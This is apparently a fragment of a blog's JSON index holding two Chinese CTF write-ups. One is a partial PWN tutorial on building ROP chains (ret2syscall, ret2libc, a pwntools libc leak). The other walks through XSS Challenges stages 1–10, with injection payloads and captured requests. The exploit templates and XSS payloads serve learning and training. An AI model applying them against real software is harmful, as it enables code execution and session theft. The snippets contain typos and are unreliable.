](https://www.freebuf.com/articles/system/234228.html)\n\n**Syscall 调用规范** `execve(“/bin/sh”, 0,0)`\n\n它对应的汇编代码为：\npop eax# 系统调用号载入， execve为0xbpop ebx# 第一个参数， &#x2F;bin&#x2F;sh的stringpop ecx# 第二个参数，0pop edx# 第三个参数，0int 0x80\ntxt\n寻找对应可以利用的 `ret(gadgets)`可以使用 `ropgadgets` 这个工具\n\n对应寻找步骤：\n\n```sh\n $ ROPgadget --binary 对应文件  --only &#39;pop|ret&#39; | grep &#39;eax&#39;  //search eax  \n 0x080bb196 : pop eax ; ret\n ------------------------------------------------------------------------------------------------------------------\n $ ROPgadget --binary 对应文件  --only &#39;pop|ret&#39; | grep &#39;ebx&#39;  //search ebx\\edx\\ecx\n 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n ------------------------------------------------------------------------------------------------------------------\n $ROPgadget --binary 对应文件  --string &#39;/bin/sh&#39;   //search &#39;bin/sh&#39;\n    Strings information\n    ============================================================\n    0x080be408 : /bin/sh\n  ----------------------------------------------------------------------------------------------------------------- \n $ROPgadget --binary 对应文件  --only &#39;int&#39;       // search int 0x80         \n    Gadgets information\n    ============================================================\n    0x08049421 : int 0x80对应 exp 构造模式：\npythonpop_eax_ret = 可利用的 eax 的地址\npop_edx_ecx_ebx_ret = 可利用的 ebx、edx、ecx地址\nint_0x80 = int 0x80 的地址\nbinsh = &#39;bin/sh&#39; 的地址\npayload = flat([&#39;A&#39; * 溢出长度, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])\nio.sendline(payload)Ret2libcret2libc 即控制函数的执行 libc (Linux下C库) 中的函数，通常是返回至某个函数的 PLT 处或者函数的具体位置 ( 即函数对应的 got 表项的内容 )。一般情况下，我们会选择执行 system(&quot;/bin/sh&quot;)。\n含有 system 和 &#x2F;bin&#x2F;sh一般函数中含有 /bin/sh 、system 函数时构造对应的 exp 构建模式为：\npythonbinsh_addr = /bin/sh/ 的地址\nsystem_plt = system 函数的地址\npayload = flat([&#39;a&#39; * 溢出长度, system_plt,&#39;b&#39; * 4,binsh_addr])需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。\n不含有 &#x2F;bin&#x2F;sh如果函数中不含有 /bin/sh 时，我们需要在bss段上自己构建一个/bin/sh\n此时 exp 构造模式为：\npythonsystem_plt = system 函数地址\ngets_addr = 溢出点函数地址\nbuf_addr = bss 段上变量地址\npayload = flat([&#39;a&#39; * 溢出长度,gets_addr,system_plt,buf_addr,buf_addr])\nio.sendline(payload)\nio.sendline(&#39;/bin/sh&#39;)\n\n\n\n\n\n\n\n\n对应的栈分布为：\n\ngets地址\nsystem地址（也是gets的返回地址）\nbuf2（是gets的参数）\nbuf2（是system的参数）\n\n或者：\n寻找一个 pop：\nshROPgadget --binary ret2libc2 --only &#39;pop|ret&#39;| grep &#39;ebx&#39;\n0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0804843d : pop ebx ; ret之后的 exp 构造模式：\npythonsystem_plt = system 函数地址\npop_ebx = ret ebx 的地址\ngets_addr = 溢出点函数地址\nbuf_addr = bss 段上变量地址\npayload = flat([&#39;a&#39; * 溢出长度,gets_addr,pop_ebx,system_plt,&#39;A&#39;*4,buf_addr])\nio.sendline(payload)\nio.sendline(&#39;/bin/sh&#39;)\n\n\n\n\n\n\n\n\n对应的栈分布为：\n\ngets地址\npop ebx ；ret地址\nbuf2（gets的参数）\nsystem地址\nsystem的返回地址（’AAAA’）\nbuf2（system的参数）\n\n在调用gets函数后，把参数buf2给pop掉，这样返回地址就变成了system，就会返回到system。\n不含有 System 和 &#x2F;bin&#x2F;sh两个都没有给出的话需要自己寻找对应版本的 libc\n泄露函数地址：\npythonfrom pwn import *\nio=process(&#39;./&#39;)\nelf=ELF(&#39;./&#39;)\nputs_plt = elf.plt[&#39;puts&#39;]\nlibc_start_main_got = elf.got[&#39;__libc_start_main&#39;]\nmain = elf.symbols[&#39;main&#39;]\nputs_got = elf.got[&#39;puts&#39;]\n\nprint &quot;leak libc_start_main_got addr and return to main again&quot;\npayload = &#39;a&#39; * 溢出长度 + p32(puts_plt) + p32(main) +p32(libc_start_main_go)\n# io.recvuntil(&#39;&#39;)\nio.sendline(payload1)\n\nprint &quot;get the related addr&quot;\nlibc_start_main_addr = u32(p.recv()[0:4])     \nprint(&quot;addr:&quot; + hex(libc_start_main_addr))对应构造 exp 模式为：\npythonsystem_addr = 找到对应 libc 版本后 system 的地址\nbinsh_addr = 找到对饮 libc版本后 /bin/sh 的地址\npayload = flat([&#39;A&#39; * 溢出长度(需要用 cyclic 重新测试), system_addr, 0xdeadbeef, binsh_addr]) # 0xdeadbeef 为 system 地址返回，可以随意设置\nsh.sendline(payload)一共需要两次 exp的编写，便可以完成对没有/bin/sh与system的ret2libc题目\n","slug":"PWN的基本ROP链构造","date":"2022-05-15T18:49:36.000Z","categories_index":"CTF","tags_index":"PWN","author_index":"xmmlaz"},{"id":"7fcba27f174cb492cad0a42b50923924","title":"XSS Challenges","content":"XSS ChallengesStage #1发现没有任何过滤，并且不需要任何闭合\nshell&lt;img src=&#39;#&#39; onerror=alert(document.domain) /&gt;Stage #2查看源码发现需要闭合输入框的HTML标签\nshell&quot;&gt;&lt;img src=&#39;#&#39; onerror=alert(document.domain) /&gt;&lt;&quot;Stage #3尝试闭合发现也没有反应，查看源码发现搜索框已经做了转移处理，并且发现是一个POST请求，后面的Choose a country没有转移处理，将此作为注入点。\n通过POST插入\nshellPOST /stage-3.php?sid=56552ee93b02c991d229f72f3e6c36c43d5e91b3 HTTP/1.1\nHost: xss-quiz.int21h.jp\nCookie: PHPSESSID=0b5vrk9b5ra4pl60nl7kmueu0t; __utma=251560719.1469267736.1682478672.1682478672.1682478672.1; __utmc=251560719; __utmz=251560719.1682478672.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=251560719.2.10.1682478672\nContent-Length: 61\nCache-Control: max-age=0\nSec-Ch-Ua: &quot;Not:A-Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;112&quot;\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: &quot;Windows&quot;\nUpgrade-Insecure-Requests: 1\nOrigin: https://xss-quiz.int21h.jp\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://xss-quiz.int21h.jp/stage-3.php?sid=1946a40f2fb5b91a1f66b57c53948f60e033111f\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\np1=123&amp;p2=&lt;img src=&#39;#&#39; onerror=alert(document.domain) /&gt;JapanStage #4查看源码，发现有一个隐藏的字段\nshell&lt;input type=&quot;hidden&quot; name=&quot;p3&quot; value=&quot;hackme&quot;&gt;使用burp插入xss语句，注意闭合。\nshellPOST /stage_4.php?sid=a681339d09976811649b42466437ed3771cb3fcb HTTP/1.1\nHost: xss-quiz.int21h.jp\nCookie: PHPSESSID=0b5vrk9b5ra4pl60nl7kmueu0t; __utma=251560719.1469267736.1682478672.1682478672.1682478672.1; __utmc=251560719; __utmz=251560719.1682478672.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=251560719.7.10.1682478672\nContent-Length: 19\nCache-Control: max-age=0\nSec-Ch-Ua: &quot;Not:A-Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;112&quot;\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: &quot;Windows&quot;\nUpgrade-Insecure-Requests: 1\nOrigin: https://xss-quiz.int21h.jp\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://xss-quiz.int21h.jp/stage_4.php?sid=aca950e4dd9081e0241f323c567bb8b3ac3824e7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\np1=123&amp;p2=Japan&amp;p3=&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;&quot;Stage #5发现限制了输入长度并且为value标签，所以需要修改长度并闭合value\nshell&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;&quot;Stage #6发现与第二关类似，但是使用第二关exp打不通，发现&lt;&gt;被过滤，可以使用”闭合。\nshell&quot; onmouseover=alert(document.domain) name=&quot;1onmouseover是鼠标移到上面就会触发的事件\nStage #7跟第六关一样过滤&lt;&gt;，但是同时发现”也被过滤，无法用”分隔属性，但是可以用空格分隔。\nshell&quot; onclick=alert(document.domain)　　Stage #8观察题目要求让我们在url中运行javascript。\nshelljavascript:alert(document.domain)插入了一个url，点击即可弹窗。\nStage #9根据hint我们发现使用的utf-7。\n直接修改元素\n改为第二关的exp即可\nshell&quot;&gt;&lt;img src=&#39;#&#39; onerror=alert(document.domain) /&gt;&lt;&quot;Stage #10经过测试，发现domain被过滤了，可以直接双写绕过。\nshell&quot;&gt;&lt;img src=&#39;#&#39; onerror=alert(document.dodomainmain) /&gt;&lt;&quot;","slug":"XSS Challenges","date":"2021-08-15T18:49:36.000Z","categories_index":"CTF","tags_index":"XSS","author_index":"xmmlaz"}]